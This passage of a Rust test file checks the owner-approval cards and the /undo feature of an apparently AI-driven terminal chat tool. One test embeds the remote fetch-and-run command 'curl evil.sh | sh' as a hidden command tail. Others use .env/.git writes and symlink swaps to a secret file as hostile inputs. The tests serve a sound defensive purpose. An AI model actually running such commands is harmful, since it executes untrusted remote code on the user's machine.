        .replacen("x1\n", "first\u{202e}\n", 1)
        .replacen("x100\n", "last\n", 1);
    fs::write(root.join("mod.py"), &old).unwrap();
    let write = call("write_file", json!({"path": "mod.py", "content": &new}));
    let card = approval::card(&root, &write).unwrap();
    assert_eq!(
        card.preview,
        "@@ line 1 @@\n-x1\n+first\u{202e}\n@@ line 100 @@\n-x100\n+last"
    );
    let text = card_screen(root.clone(), &write);
    assert!(text.contains("+first<U+202E>"), "{text}");
    assert!(!text.contains("x50"), "{text}");
    let root = workspace("minimal-hunks-apply");
    fs::write(root.join("mod.py"), &old).unwrap();
    let card = approval::card(&root, &write).unwrap();
    // The file changing after the preview still refuses the apply.
    fs::write(root.join("mod.py"), old.replacen("x50\n", "other\n", 1)).unwrap();
    assert!(approval::apply(&root, &card).is_err());
    assert_eq!(
        fs::read_to_string(root.join("mod.py")).unwrap(),
        old.replacen("x50\n", "other\n", 1)
    );
    fs::write(root.join("mod.py"), &old).unwrap();
    approval::apply(&root, &card).unwrap();
    assert_eq!(fs::read_to_string(root.join("mod.py")).unwrap(), new);
    let _ = fs::remove_dir_all(root);
}

/// Issue #273: a chat parked on a card says it needs the owner, not "thinking".
#[test]
fn a_pending_card_shows_approve_in_the_side_pane_row_and_the_header() {
    let mut app = App::new("m".into());
    app.sessions[0] = pending_session();
    assert_eq!(app.sessions[0].short_status(), "approve?");
    assert_eq!(app.sessions[0].wait_phase(), Some("waiting for approval"));
    assert_eq!(app.sessions[0].status_label(), "Waiting for your approval");
    let mut terminal = Terminal::new(TestBackend::new(140, 40)).unwrap();
    terminal.draw(|frame| ui::draw(frame, &app)).unwrap();
    let text = screen(&terminal);
    let rows: Vec<&str> = text.lines().filter(|row| row.contains("chat 1")).collect();
    assert!(
        rows.iter().any(|row| row.contains("approve?")),
        "side pane row: {text}"
    );
    assert!(!text.contains("thinking"), "{text}");
    assert!(!text.contains("waiting for model"), "{text}");
    assert!(text.contains("Chat 1 · approve?"), "header: {text}");
    // The card is answered: the turn is model time again.
    let after = Instant::now() + approval::ARM;
    assert!(app.sessions[0].answer_approval('y', after).is_some());
    assert_ne!(app.sessions[0].short_status(), "approve?");
}

#[test]
fn the_turn_clock_excludes_the_time_spent_waiting_on_the_owner() {
    let mut session = Session::new("m".into());
    session.insert("redraft README");
    session.begin().unwrap();
    let attempt = session.attempt;
    session.apply(attempt, Update::Admitted);
    let card = pending_session().pending_approval().unwrap().clone();
    let started = Instant::now();
    let raised = started + Duration::from_secs(2);
    assert!(session.await_approval(attempt, card, raised));
    session.set_approval_whole(true);
    session.approval_visible(true, raised);
    // The owner is away for 30 s.
    let answered = raised + Duration::from_secs(30);
    assert!(session.answer_approval('y', answered).is_some());
    let later = answered + Duration::from_secs(1);
    let timing = session.timing.as_ref().unwrap();
    // `Timing::new` ran at begin(), so measure what the clock added since the card.
    let during = timing.compact(later);
    let before = timing.compact(raised);
    let added: f64 = during.trim_end_matches('s').parse::<f64>().unwrap()
        - before.trim_end_matches('s').parse::<f64>().unwrap();
    assert!(
        (0.9..=1.1).contains(&added),
        "30 s of owner wait must not count: {before} -> {during}"
    );
}

#[test]
fn a_card_in_a_background_chat_posts_a_needs_approval_notice() {
    let mut app = App::new("m".into());
    app.sessions.push(pending_session());
    app.selected = 0;
    app.note_approval_wait(1);
    assert_eq!(app.notice, "Chat 2 needs approval");
    app.notice.clear();
    app.note_approval_wait(0);
    assert_eq!(app.notice, "", "the selected chat shows the card itself");
}

fn tall_pending_session() -> Session {
    let root = workspace("tall");
    // 79 lines: the whole diff (80 with its header) fits the cap, but not a 24-row screen.
    let body: String = (1..=79).map(|n| format!("line {n}\n")).collect();
    let card = approval::card(
        &root,
        &call("write_file", json!({"path": "long.txt", "content": body})),
    )
    .unwrap();
    let _ = fs::remove_dir_all(root);
    let mut session = Session::new("m".into());
    // A long earlier message gives PgUp something to scroll through.
    session.insert(&"earlier context line\n".repeat(60));
    session.begin().unwrap();
    let attempt = session.attempt;
    session.apply(attempt, Update::Admitted);
    assert!(session.await_approval(attempt, card, Instant::now()));
    session
}

fn screen(terminal: &Terminal<TestBackend>) -> String {
    let buffer = terminal.backend().buffer();
    let width = usize::from(buffer.area.width);
    buffer
        .content()
        .chunks(width)
        .map(|row| row.iter().map(|cell| cell.symbol()).collect::<String>())
        .collect::<Vec<_>>()
        .join("\n")
}

/// Mirrors the main loop: draw, then report whether the card's header is on screen.
fn draw_and_report(terminal: &mut Terminal<TestBackend>, app: &mut App, now: Instant) -> String {
    terminal.draw(|frame| ui::draw(frame, app)).unwrap();
    let session = &mut app.sessions[0];
    let drawn = session.approval_header_drawn();
    session.approval_visible(drawn, now);
    screen(terminal)
}

#[test]
fn a_tall_card_keeps_its_header_path_and_key_line_on_screen() {
    let mut app = App::new("m".into());
    app.sessions[0] = tall_pending_session();
    let mut terminal = Terminal::new(TestBackend::new(100, 24)).unwrap();
    let text = draw_and_report(&mut terminal, &mut app, Instant::now());
    assert!(text.contains("Approve write_file"), "{text}");
    assert!(text.contains("long.txt"), "{text}");
    assert!(text.contains("+line 1"), "{text}");
    assert!(text.contains("more diff lines"), "{text}");
    // A cut diff is deny-only (issue #269): the key line says why `y` is off.
    assert!(text.contains("n deny"), "{text}");
    assert!(text.contains("y is off"), "{text}");
    assert!(!text.contains("a always allow"), "{text}");
    assert!(text.contains("Esc cancels the turn (deny)"), "{text}");
}

#[test]
fn a_card_scrolled_out_of_view_does_not_accept_keys_until_its_header_returns() {
    let mut app = App::new("m".into());
    app.sessions[0] = tall_pending_session();
    let mut terminal = Terminal::new(TestBackend::new(100, 24)).unwrap();
    let start = Instant::now();
    draw_and_report(&mut terminal, &mut app, start);
    let armed = start + approval::ARM + Duration::from_millis(1);
    app.sessions[0].scroll_rows(-40);
    let text = draw_and_report(&mut terminal, &mut app, armed);
    assert!(!text.contains("Approve write_file"), "{text}");
    let later = armed + approval::ARM * 4;
    assert_eq!(app.sessions[0].answer_approval('y', later), None);
    assert_eq!(app.sessions[0].answer_approval('n', later), None);
    // Back at the bottom: shown again, so armed again only after the delay.
    app.sessions[0].scroll_rows(40);
    let text = draw_and_report(&mut terminal, &mut app, later);
    assert!(text.contains("Approve write_file"), "{text}");
    assert_eq!(app.sessions[0].answer_approval('y', later), None);
    assert_eq!(
        app.sessions[0].answer_approval('n', later + approval::ARM),
        Some(Decision::Deny)
    );
}

fn shell_session(command: &str, escalate: bool) -> Session {
    let root = workspace("shell");
    let card = approval::card(
        &root,
        &call(
            "run_command",
            json!({"command": command, "escalate": escalate}),
        ),
    )
    .unwrap();
    let _ = fs::remove_dir_all(root);
    let mut session = Session::new("m".into());
    session.insert("run it");
    session.begin().unwrap();
    let attempt = session.attempt;
    session.apply(attempt, Update::Admitted);
    assert!(session.await_approval(attempt, card, Instant::now()));
    session
}

/// Draws a pending run_command card and answers `y` after the arm delay.
fn answer_y(command: &str, escalate: bool, width: u16, height: u16) -> (Option<Decision>, String) {
    let mut app = App::new("m".into());
    app.sessions[0] = shell_session(command, escalate);
    let mut terminal = Terminal::new(TestBackend::new(width, height)).unwrap();
    let start = Instant::now();
    draw_and_report(&mut terminal, &mut app, start);
    let later = start + approval::ARM + Duration::from_millis(1);
    let text = draw_and_report(&mut terminal, &mut app, later);
    let answer = app.sessions[0].answer_approval('y', later + approval::ARM);
    (answer, text)
}

/// What a drawn run_command card answers to `y`, `a` and `n` once armed.
#[derive(Debug)]
struct KeyProbe {
    y: Option<Decision>,
    a: Option<Decision>,
    n: Option<Decision>,
    whole: bool,
    header: bool,
    text: String,
}

/// Draws a pending run_command card at `width`x`height`, waits out the arm delay and
/// tries `y`, `a` then `n` (a refused key leaves the card pending).
fn probe_keys(command: &str, escalate: bool, width: u16, height: u16) -> KeyProbe {
    probe_session(shell_session(command, escalate), width, height)
}

fn probe_session(session: Session, width: u16, height: u16) -> KeyProbe {
    let mut app = App::new("m".into());
    app.sessions[0] = session;
    let mut terminal = Terminal::new(TestBackend::new(width, height)).unwrap();
    let start = Instant::now();
    draw_and_report(&mut terminal, &mut app, start);
    let later = start + approval::ARM * 2;
    let text = draw_and_report(&mut terminal, &mut app, later);
    let session = &mut app.sessions[0];
    let (whole, header) = (session.approval_whole(), session.approval_header_drawn());
    let at = later + approval::ARM;
    let y = session.answer_approval('y', at);
    let a = session.answer_approval('a', at);
    let n = session.answer_approval('n', at);
    KeyProbe {
        y,
        a,
        n,
        whole,
        header,
        text,
    }
}

/// Issue #303: every run_command card that fits arms with its header on screen, at the
/// sizes the 10-21 attempt broke (80x10 armed with the header scrolled off).
#[test]
fn a_run_command_card_that_fits_is_answered_with_header_and_command_on_screen() {
    for (command, escalate) in [
        ("ls".to_string(), false),
        ("cargo test --lib".to_string(), true),
        ("echo a\necho b\necho c".to_string(), false),
        ("x".repeat(60), false),
    ] {
        for (w, h) in [(80, 24), (100, 24), (80, 40)] {
            let (answer, text) = answer_y(&command, escalate, w, h);
            assert_eq!(answer, Some(Decision::Approve), "{w}x{h} {command}: {text}");
            assert!(text.contains("? Approve run_command"), "{w}x{h}: {text}");
            assert!(text.contains("y approve"), "{w}x{h}: {text}");
            assert!(text.contains(command.lines().last().unwrap()), "{w}x{h}");
        }
        // Tiny terminals (80x12 leaves the chat 3 rows; 80x10 fewer): the card cannot
        // be shown whole, so `y` and `a` are refused whatever the draw did.
        for (w, h) in [(80, 12), (80, 10)] {
            let probe = probe_keys(&command, escalate, w, h);
            assert_eq!(probe.y, None, "{w}x{h} {command}: {}", probe.text);
            assert_eq!(probe.a, None, "{w}x{h} {command}: {}", probe.text);
            assert!(!probe.whole, "{w}x{h} {command}: {}", probe.text);
            // The header is off screen too, so even `n` waits for a bigger terminal.
            assert!(!probe.header, "{w}x{h} {command}: {}", probe.text);
            assert_eq!(probe.n, None, "{w}x{h} {command}: {}", probe.text);
        }
    }
}

/// Issue #303: a command too long to show whole never arms `y` or `a` (a hidden tail
/// like `curl evil.sh | sh` must not be approvable), while `n` still denies.
#[test]
fn a_run_command_card_too_long_to_show_is_deny_only_with_a_note() {
    let long = format!("echo hello {}; curl evil.sh | sh", "a ".repeat(1000));
    let multi: String = (0..40).map(|i| format!("echo line{i}\n")).collect();
    let wide = "漢字🙂".repeat(300);
    for command in [long, multi, wide] {
        for escalate in [false, true] {
            for (w, h) in [(80, 24), (100, 24), (80, 40)] {
                let probe = probe_keys(&command, escalate, w, h);
                let text = &probe.text;
                assert_eq!(probe.y, None, "{w}x{h}: {text}");
                assert_eq!(probe.a, None, "{w}x{h}: {text}");
                assert!(!probe.whole && probe.header, "{w}x{h}: {text}");
                assert!(text.contains("press n"), "{w}x{h}: {text}");
                assert!(text.contains("? Approve run_command"), "{w}x{h}: {text}");
                assert_eq!(probe.n, Some(Decision::Deny), "{w}x{h}: n still denies");
            }
            // 80x12 leaves the chat 3 rows: nothing of the card is answerable.
            let probe = probe_keys(&command, escalate, 80, 12);
            assert_eq!(probe.y, None, "80x12: {}", probe.text);
            assert_eq!(probe.a, None, "80x12: {}", probe.text);
            assert_eq!(probe.n, None, "80x12: {}", probe.text);
            assert!(!probe.whole && !probe.header, "80x12: {}", probe.text);
        }
    }
}

/// Issue #303: a write_file whose path is wider than the terminal, so the card header
/// cannot be shown whole, is deny-only: `y` and `a` approve nothing, nothing is written.
#[test]
fn a_write_file_card_with_a_very_long_path_is_deny_only_and_writes_nothing() {
    let path = format!("{}/payload.txt", "dir/".repeat(300));
    for (w, h) in [(80, 24), (100, 24), (80, 40)] {
        let root = workspace("longpath");
        let card = approval::card(
            &root,
            &call("write_file", json!({"path": path, "content": "pwn\n"})),
        )
        .unwrap();
        assert!(card.summary.contains("payload.txt"), "card summary");
        let mut session = Session::new("m".into());
        session.insert("write it");
        session.begin().unwrap();
        let attempt = session.attempt;
        session.apply(attempt, Update::Admitted);
        assert!(session.await_approval(attempt, card.clone(), Instant::now()));
        let probe = probe_session(session, w, h);
        let text = &probe.text;
        assert!(text.contains("Approve write_file"), "{w}x{h}: {text}");
        assert!(text.contains("press n"), "{w}x{h}: {text}");
        assert!(text.contains("y is off"), "{w}x{h}: {text}");
        assert!(!text.contains("a always"), "{w}x{h}: {text}");
        assert!(probe.header && !probe.whole, "{w}x{h}: {text}");
        assert_eq!(probe.y, None, "{w}x{h}: {text}");
        assert_eq!(probe.a, None, "{w}x{h}: {text}");
        assert_eq!(probe.n, Some(Decision::Deny), "{w}x{h}: {text}");
        // Nothing was approved, so nothing was applied.
        assert!(!root.join("dir").exists(), "{w}x{h}: wrote under the root");
        let _ = fs::remove_dir_all(root);
    }
}

fn write_file_session(root: &Path, content: &str) -> Session {
    let card = approval::card(
        root,
        &call("write_file", json!({"path": "big.txt", "content": content})),
    )
    .unwrap();
    let mut session = Session::new("m".into());
    session.insert("write it");
    session.begin().unwrap();
    let attempt = session.attempt;
    session.apply(attempt, Update::Admitted);
    assert!(session.await_approval(attempt, card, Instant::now()));
    session
}

/// Issue #269: a diff under the 80-line cap whose one line is far taller than the
/// terminal is cut by the viewport, so `y` and `a` approve nothing; nothing is written.
#[test]
fn a_write_file_card_with_one_huge_line_is_deny_only_and_writes_nothing() {
    let huge = format!("{}\n", "x".repeat(200_000));
    // A line of wide characters, and many wrapped lines under the cap, cut the same way.
    let wide = format!("{}\n", "漢".repeat(50_000));
    let wrapped: String = (0..70)
        .map(|i| format!("{i} {}\n", "w".repeat(150)))
        .collect();
    for content in [huge, wide, wrapped] {
        for (w, h) in [(80, 24), (100, 24), (80, 40)] {
            let root = workspace("hugeline");
            let probe = probe_session(write_file_session(&root, &content), w, h);
            let text = &probe.text;
            assert!(text.contains("Approve write_file"), "{w}x{h}: {text}");
            assert!(text.contains("press n"), "{w}x{h}: {text}");
            assert!(probe.header && !probe.whole, "{w}x{h}: {text}");
            assert_eq!(probe.y, None, "{w}x{h}: {text}");
            assert_eq!(probe.a, None, "{w}x{h}: {text}");
            assert_eq!(probe.n, Some(Decision::Deny), "{w}x{h}: {text}");
            assert!(!root.join("big.txt").exists(), "{w}x{h}: wrote the file");
            let _ = fs::remove_dir_all(root);
        }
    }
}

/// Issue #269: a write_file card that fits whole on screen still arms.
#[test]
fn a_write_file_card_that_fits_still_arms() {
    let root = workspace("fits");
    let probe = probe_session(write_file_session(&root, "one\ntwo\n"), 80, 24);
    assert!(probe.whole && probe.header, "{}", probe.text);
    assert_eq!(probe.y, Some(Decision::Approve), "{}", probe.text);
    let _ = fs::remove_dir_all(root);
}

/// Issue #303: what a draw said about the previous card never carries to a new one.
#[test]
fn a_new_card_is_not_answerable_by_y_until_it_is_drawn() {
    let mut session = pending_session();
    let card = session.pending_approval().unwrap().clone();
    let attempt = session.attempt;
    let now = Instant::now();
    assert!(session.await_approval(attempt, card.clone(), now));
    // Mirrors the main loop: visible only when the last draw showed the header.
    session.approval_visible(session.approval_header_drawn(), now);
    let armed = now + approval::ARM * 2;
    assert_eq!(session.answer_approval('y', armed), None, "not drawn yet");
    assert_eq!(
        session.answer_approval('n', armed),
        None,
        "header not drawn yet"
    );
    // A cancelled turn forgets the draw too.
    let mut session = pending_session();
    session.cancel();
    assert!(!session.approval_whole() && !session.approval_header_drawn());
}

#[test]
fn cancel_and_restore_drop_the_pending_action() {
    let mut session = pending_session();
    assert!(session.pending_approval().is_some());
    let saved = serde_json::to_string(&session).unwrap();
    let restored: Session = serde_json::from_str(&saved).unwrap();
    assert!(
        restored.pending_approval().is_none(),
        "restore never re-asks or runs"
    );
    let armed = Instant::now() + approval::ARM;
    assert_eq!(session.answer_approval('y', armed), Some(Decision::Approve));
    assert!(session.pending_approval().is_none());
    let mut session = pending_session();
    session.cancel();
    assert!(session.pending_approval().is_none());
    assert!(!session.status.active());
    // A retried turn never shows the old attempt's card.
    let mut session = pending_session();
    let attempt = session.attempt;
    session.apply(attempt, Update::Failed("boom".into()));
    session.retry().unwrap();
    assert!(session.status.active());
    assert!(session.pending_approval().is_none());
}

#[test]
fn the_prompt_title_says_how_to_answer_when_the_draft_has_text() {
    let mut app = App::new("m".into());
    app.sessions[0] = pending_session();
    app.sessions[0].type_char('h');
    let mut terminal = Terminal::new(TestBackend::new(120, 40)).unwrap();
    terminal.draw(|frame| ui::draw(frame, &app)).unwrap();
    let text: String = terminal
        .backend()
        .buffer()
        .content()
        .iter()
        .map(|cell| cell.symbol())
        .collect();
    assert!(text.contains("clear the draft to answer"), "{text}");
}

#[test]
fn y_or_n_never_decides_while_the_draft_has_text() {
    // Issue #264: typeahead into the prompt ("hey", "you", "hold on") must not decide.
    let mut session = pending_session();
    let t0 = Instant::now() + Duration::from_secs(1);
    for (i, ch) in "hey".chars().enumerate() {
        let at = t0 + Duration::from_secs(i as u64 * 2);
        session.note_key(at);
        if session.approval_key_answers(at) {
            // Only the leading h could be eligible, and it is not y or n.
            assert_eq!(session.answer_approval(ch, at), None);
        }
        session.type_char(ch);
    }
    assert_eq!(session.draft, "hey");
    let later = t0 + Duration::from_secs(60);
    session.note_key(later);
    assert!(!session.approval_key_answers(later));
    assert_eq!(session.answer_approval('y', later), None);
    assert_eq!(session.answer_approval('n', later), None);
    assert!(session.pending_approval().is_some());
}

#[test]
fn queued_messages_show_as_you_queued_rows_and_the_prompt_is_empty() {
    // Issue #338.
    let mut app = App::new("m".into());
    app.sessions[0].insert("first question");
    app.sessions[0].begin().unwrap();
    app.sessions[0].insert("second\nquestion");
    app.sessions[0].queue_draft().unwrap();
    let mut terminal = Terminal::new(TestBackend::new(120, 40)).unwrap();
    terminal.draw(|frame| ui::draw(frame, &app)).unwrap();
    let rows: Vec<String> = terminal
        .backend()
        .buffer()
        .content()
        .chunks(120)
        .map(|row| row.iter().map(|cell| cell.symbol()).collect())
        .collect();
    let at = rows
        .iter()
        .position(|row| row.contains("You · queued"))
        .unwrap_or_else(|| panic!("{rows:#?}"));
    assert!(rows[at + 1].contains("second"), "{rows:#?}");
    assert!(rows[at + 2].contains("question"), "{rows:#?}");
    assert_eq!(rows.iter().filter(|row| row.contains("second")).count(), 1);
}

#[test]
fn enter_while_a_card_waits_is_refused_and_queued_text_never_answers_it() {
    // Issue #338: a card keeps today's Enter behaviour; nothing is queued behind it.
    let mut session = pending_session();
    session.insert("yes please");
    assert_eq!(
        session.queue_draft().unwrap_err(),
        "Esc stops the reply, or wait for it"
    );
    assert_eq!(session.draft, "yes please");
    assert!(session.queued_messages().is_empty());
    assert!(session.pending_approval().is_some());
}

#[test]
fn y_with_an_empty_draft_needs_a_quiet_half_second() {
    let mut session = pending_session();
    let t0 = Instant::now() + Duration::from_secs(1);
    // A key just before (for example Backspace on an empty draft) blocks the answer.
    session.note_key(t0);
    let fast = t0 + Duration::from_millis(100);
    session.note_key(fast);
    assert!(!session.approval_key_answers(fast));
    assert_eq!(session.answer_approval('y', fast), None);
    assert!(session.pending_approval().is_some());
    // After a quiet 0.5 s the key decides.
    let quiet = fast + approval::ARM + Duration::from_millis(1);
    session.note_key(quiet);
    assert!(session.approval_key_answers(quiet));
    assert_eq!(session.answer_approval('y', quiet), Some(Decision::Approve));
}

#[test]
fn keys_before_the_card_is_armed_do_not_decide() {
    let mut session = pending_session();
    let shown = Instant::now();
    // Typeahead: a key arriving right after the card appears is ignored.
    assert_eq!(session.answer_approval('y', shown), None);
    assert_eq!(
        session.answer_approval('n', shown + Duration::from_millis(100)),
        None
    );
    assert!(session.pending_approval().is_some());
    let armed = shown + approval::ARM + Duration::from_millis(1);
    assert_eq!(session.answer_approval('x', armed), None);
    assert!(session.pending_approval().is_some());
    assert_eq!(session.answer_approval('n', armed), Some(Decision::Deny));
    assert!(session.pending_approval().is_none());
}

#[test]
fn chat_system_prompt_no_longer_claims_chat_cannot_edit() {
    let Message {
        content: prompt, ..
    } = alfredo_tui::chat_context::system_message(None, |_| None);
    assert!(prompt.contains("edit_file"), "{prompt}");
    assert!(!prompt.to_lowercase().contains("cannot edit"), "{prompt}");
}

/// Issue #303: shrinking below the minimum size hides the card, so a draw there
/// clears what the last draw said and `y` no longer approves it.
#[test]
fn shrinking_below_the_minimum_size_disarms_a_card_that_was_whole() {
    let mut app = App::new("m".into());
    app.sessions[0] = shell_session("ls", false);
    let mut terminal = Terminal::new(TestBackend::new(80, 24)).unwrap();
    let start = Instant::now();
    draw_and_report(&mut terminal, &mut app, start);
    let later = start + approval::ARM * 2;
    draw_and_report(&mut terminal, &mut app, later);
    assert!(app.sessions[0].approval_whole() && app.sessions[0].approval_header_drawn());
    terminal.backend_mut().resize(31, 9);
    draw_and_report(&mut terminal, &mut app, later + Duration::from_millis(1));
    assert!(!app.sessions[0].approval_whole() && !app.sessions[0].approval_header_drawn());
    let at = later + approval::ARM * 2;
    assert_eq!(app.sessions[0].answer_approval('y', at), None);
    assert_eq!(
        app.sessions[0].answer_approval('n', at),
        None,
        "header rule"
    );
}

// ---- /undo (issue #325): restore the last turn's approved edits from pre-images ----

use chat_tools::undo;

fn tool_calls(calls: &[(&str, serde_json::Value)]) -> Reply {
    let calls: Vec<_> = calls
        .iter()
        .map(|(name, arguments)| json!({"function": {"name": name, "arguments": arguments}}))
        .collect();
    Reply::Stream(
        vec![
            format!(
                "{}\n",
                json!({"message":{"role":"assistant","content":"","tool_calls":calls},"done":false})
            )
            .into_bytes(),
            format!("{}\n", json!({"message":{"content":""},"done":true})).into_bytes(),
        ],
        Duration::ZERO,
    )
}

/// One approved turn whose outcomes (and undo pre-images) go to `state`.
async fn approved_turn(root: &Path, state: &Path, first: Reply) {
    let (gate, _) = gate_with(Some(Decision::Approve), Some(Log::new(state)), || {});
    turn(root, first, Some(gate)).await;
}

fn undo_now(root: &Path, state: &Path) -> String {
    undo::run(root, state, Some(&Log::new(state)))
        .expect("undo runs")
        .join("\n")
}

fn edit_readme(new: &str) -> Reply {
    tool_call(
        "edit_file",
        json!({"path": "README.md", "old_text": "Old intro line.", "new_text": new}),
    )
}

#[tokio::test]
async fn undo_restores_the_last_turns_edit_and_logs_it() {
    let root = workspace("undo-restore");
    let state = log_dir("undo-restore");
    approved_turn(&root, &state, edit_readme("New intro line.")).await;
    assert_ne!(fs::read_to_string(root.join("README.md")).unwrap(), README);
    let report = undo_now(&root, &state);
    assert!(report.contains("README.md"), "{report}");
    assert_eq!(fs::read_to_string(root.join("README.md")).unwrap(), README);
    let records = Log::new(&state).records();
    let last = records.last().unwrap();
    assert_eq!(last.tool, "undo");
    assert_eq!(last.outcome, Outcome::Applied);
    assert!(last.target.contains("README.md"), "{last:?}");
}

#[tokio::test]
async fn undo_refuses_a_file_changed_since_and_names_it_but_restores_the_rest() {
    let root = workspace("undo-refuse");
    let state = log_dir("undo-refuse");
    fs::write(root.join("a.txt"), "a one\n").unwrap();
    approved_turn(
        &root,
        &state,
        tool_calls(&[
            (
                "edit_file",
                json!({"path": "README.md", "old_text": "Old intro line.", "new_text": "X"}),
            ),
            (
                "edit_file",
                json!({"path": "a.txt", "old_text": "one", "new_text": "two"}),
            ),
        ]),
    )
    .await;
    let owner = "# Demo\nX\nKeep this line.\nOwner added this.\n";
    fs::write(root.join("README.md"), owner).unwrap();
    let report = undo_now(&root, &state);
    assert_eq!(fs::read_to_string(root.join("README.md")).unwrap(), owner);
    assert_eq!(fs::read_to_string(root.join("a.txt")).unwrap(), "a one\n");
    let refused = report
        .lines()
        .find(|l| l.contains("README.md"))
        .unwrap_or_else(|| panic!("{report}"));
    assert!(refused.contains("changed"), "{report}");
    assert!(report.contains("a.txt"), "{report}");
    let records = Log::new(&state).records();
    assert!(records.iter().any(|r| r.tool == "undo"
        && r.target.contains("README.md")
        && matches!(r.outcome, Outcome::Failed(_))));
    assert!(records
        .iter()
        .any(|r| r.tool == "undo" && r.target.contains("a.txt") && r.outcome == Outcome::Applied));
}

#[tokio::test]
async fn undo_deletes_a_created_file_only_when_unchanged() {
    let root = workspace("undo-create");
    let state = log_dir("undo-create");
    let create = |path: &str| tool_call("write_file", json!({"path": path, "content": "fresh\n"}));
    approved_turn(&root, &state, create("sub/dir/new.txt")).await;
    assert!(root.join("sub/dir/new.txt").exists());
    let report = undo_now(&root, &state);
    assert!(!root.join("sub/dir/new.txt").exists(), "{report}");
    assert!(report.contains("new.txt"), "{report}");

    approved_turn(&root, &state, create("again.txt")).await;
    fs::write(root.join("again.txt"), "fresh\nowner edit\n").unwrap();
    let report = undo_now(&root, &state);
    assert_eq!(
        fs::read_to_string(root.join("again.txt")).unwrap(),
        "fresh\nowner edit\n"
    );
    assert!(
        report.contains("again.txt") && report.contains("changed"),
        "{report}"
    );
}

#[tokio::test]
async fn a_second_undo_has_nothing_to_undo_and_never_reapplies_stale_data() {
    let root = workspace("undo-twice");
    let state = log_dir("undo-twice");
    approved_turn(&root, &state, edit_readme("New intro line.")).await;
    undo_now(&root, &state);
    let later = "# Demo\nMy own rewrite.\n";
    fs::write(root.join("README.md"), later).unwrap();
    let report = undo_now(&root, &state);
    assert!(
        report.to_lowercase().contains("nothing to undo"),
        "{report}"
    );
    assert_eq!(fs::read_to_string(root.join("README.md")).unwrap(), later);
}

#[tokio::test]
async fn undo_covers_only_the_last_turn() {
    let root = workspace("undo-last");
    let state = log_dir("undo-last");
    fs::write(root.join("b.txt"), "b old\n").unwrap();
    approved_turn(&root, &state, edit_readme("First turn.")).await;
    approved_turn(
        &root,
        &state,
        tool_call(
            "edit_file",
            json!({"path": "b.txt", "old_text": "old", "new_text": "new"}),
        ),
    )
    .await;
    undo_now(&root, &state);
    assert_eq!(fs::read_to_string(root.join("b.txt")).unwrap(), "b old\n");
    assert!(fs::read_to_string(root.join("README.md"))
        .unwrap()
        .contains("First turn."));
    assert!(undo_now(&root, &state)
        .to_lowercase()
        .contains("nothing to undo"));
}

#[tokio::test]
async fn a_later_turn_without_edits_leaves_nothing_to_undo() {
    let root = workspace("undo-quiet");
    let state = log_dir("undo-quiet");
    approved_turn(&root, &state, edit_readme("New intro line.")).await;
    approved_turn(&root, &state, done("just talking")).await;
    assert!(undo_now(&root, &state)
        .to_lowercase()
        .contains("nothing to undo"));
    assert!(fs::read_to_string(root.join("README.md"))
        .unwrap()
        .contains("New intro line."));
}

#[tokio::test]
async fn two_edits_to_one_file_in_a_turn_undo_to_the_original() {
    let root = workspace("undo-two");
    let state = log_dir("undo-two");
    approved_turn(
        &root,
        &state,
        tool_calls(&[
            (
                "edit_file",
                json!({"path": "README.md", "old_text": "Old intro line.", "new_text": "Mid."}),
            ),
            (
                "edit_file",
                json!({"path": "README.md", "old_text": "Mid.", "new_text": "Final."}),
            ),
        ]),
    )
    .await;
    undo_now(&root, &state);
    assert_eq!(fs::read_to_string(root.join("README.md")).unwrap(), README);
}

#[tokio::test]
async fn denied_refused_and_failed_calls_leave_nothing_to_undo() {
    let root = workspace("undo-none");
    let state = log_dir("undo-none");
    let (deny, _) = gate_with(Some(Decision::Deny), Some(Log::new(&state)), || {});
    turn(&root, edit_readme("No."), Some(deny)).await;
    approved_turn(
        &root,
        &state,
        tool_calls(&[
            ("write_file", json!({"path": ".env", "content": "KEY=1\n"})),
            (
                "write_file",
                json!({"path": ".git/config", "content": "x\n"}),
            ),
            (
                "edit_file",
                json!({"path": "README.md", "old_text": "absent text", "new_text": "y"}),
            ),
        ]),
    )
    .await;
    assert!(undo_now(&root, &state)
        .to_lowercase()
        .contains("nothing to undo"));
    assert!(!root.join(".env").exists());
}

#[tokio::test]
async fn undo_refuses_a_target_or_parent_that_became_a_symlink() {
    let root = workspace("undo-link");
    let state = log_dir("undo-link");
    let outside = workspace("undo-link-outside");
    fs::write(outside.join("secret.txt"), "outside\n").unwrap();
    fs::create_dir_all(root.join("dir")).unwrap();
    fs::write(root.join("dir/f.txt"), "f one\n").unwrap();
    approved_turn(
        &root,
        &state,
        tool_calls(&[
            (
                "edit_file",
                json!({"path": "README.md", "old_text": "Old intro line.", "new_text": "X"}),
            ),
            (
                "edit_file",
                json!({"path": "dir/f.txt", "old_text": "one", "new_text": "two"}),
            ),
        ]),
    )
    .await;
    fs::remove_file(root.join("README.md")).unwrap();
    std::os::unix::fs::symlink(outside.join("secret.txt"), root.join("README.md")).unwrap();
    fs::rename(root.join("dir"), root.join("dir-moved")).unwrap();
    std::os::unix::fs::symlink(&outside, root.join("dir")).unwrap();
    fs::write(outside.join("f.txt"), "f two\n").unwrap();
    let report = undo_now(&root, &state);
    assert!(report.contains("symlink"), "{report}");
    assert_eq!(
        fs::read_to_string(outside.join("secret.txt")).unwrap(),
        "outside\n"
    );
    assert_eq!(
        fs::read_to_string(outside.join("f.txt")).unwrap(),
        "f two\n"
    );
    assert!(fs::symlink_metadata(root.join("README.md"))
        .unwrap()
        .file_type()
        .is_symlink());
}

#[tokio::test]
async fn undo_keeps_the_read_only_refusal() {
    use std::os::unix::fs::PermissionsExt;
    let root = workspace("undo-ro");
    let state = log_dir("undo-ro");
    approved_turn(&root, &state, edit_readme("New intro line.")).await;
    let edited = fs::read_to_string(root.join("README.md")).unwrap();
    fs::set_permissions(root.join("README.md"), fs::Permissions::from_mode(0o444)).unwrap();
    let report = undo_now(&root, &state);
    assert!(report.contains("read-only"), "{report}");
    assert_eq!(fs::read_to_string(root.join("README.md")).unwrap(), edited);
}

#[tokio::test]
async fn pre_images_live_in_the_state_directory_never_in_the_workspace() {
    let root = workspace("undo-where");
    let state = log_dir("undo-where");
    let before: Vec<_> = fs::read_dir(&root)
        .unwrap()
        .map(|e| e.unwrap().file_name())
        .collect();
    approved_turn(&root, &state, edit_readme("New intro line.")).await;
    let after: Vec<_> = fs::read_dir(&root)
        .unwrap()
        .map(|e| e.unwrap().file_name())
        .collect();
    assert_eq!(before, after, "no file is added to the workspace");
    assert!(state.join("chat-undo").is_dir());
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = fs::metadata(state.join("chat-undo"))
            .unwrap()
            .permissions()
